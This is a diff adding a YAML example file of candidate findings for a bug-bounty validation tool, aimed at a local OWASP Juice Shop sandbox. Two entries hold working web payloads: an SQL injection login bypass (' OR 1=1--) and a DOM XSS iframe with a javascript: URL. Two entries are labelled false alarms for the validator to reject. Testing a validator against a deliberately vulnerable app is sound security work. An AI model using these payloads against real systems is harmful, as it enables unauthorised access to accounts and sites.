@@ -1,0 +1,42 @@
+# Example candidate findings for `bugbounty run-batch`, aimed at a local
+# Juice Shop sandbox (target #0). Two are real bugs; two are false alarms the
+# validator should reject. Run with the dry-run gate cleared (sandbox you own):
+#   docker run -d --name juiceshop -p 3000:3000 bkimminich/juice-shop
+#   DRY_RUN=false uv run bugbounty run-batch examples/juiceshop_candidates.yaml
+candidates:
+  - id: sqli-login-bypass
+    target_name: "OWASP Juice Shop (local sandbox)"
+    vuln_class: injection
+    title: SQLi authentication bypass on /rest/user/login
+    url: http://localhost:3000/rest/user/login
+    host: localhost
+    params:
+      requests:
+        - method: POST
+          url: http://localhost:3000/rest/user/login
+          body: {email: "' OR 1=1--", password: "x"}
+      oracle: {type: contains, value: authentication}
+  - id: xss-search-dom
+    target_name: "OWASP Juice Shop (local sandbox)"
+    vuln_class: xss
+    title: DOM XSS via search query
+    url: 'http://localhost:3000/#/search?q=<iframe src="javascript:alert(`xss`)">'
+    host: localhost
+  - id: sqli-false-alarm
+    target_name: "OWASP Juice Shop (local sandbox)"
+    vuln_class: injection
+    title: Failed login mislabelled as SQLi
+    url: http://localhost:3000/rest/user/login
+    host: localhost
+    params:
+      requests:
+        - method: POST
+          url: http://localhost:3000/rest/user/login
+          body: {email: "nobody@test.local", password: "wrong"}
+      oracle: {type: contains, value: authentication}
+  - id: xss-inert
+    target_name: "OWASP Juice Shop (local sandbox)"
+    vuln_class: xss
+    title: Reflected but non-executing content
+    url: 'http://localhost:3000/#/search?q=<b>inert</b>'
+    host: localhost
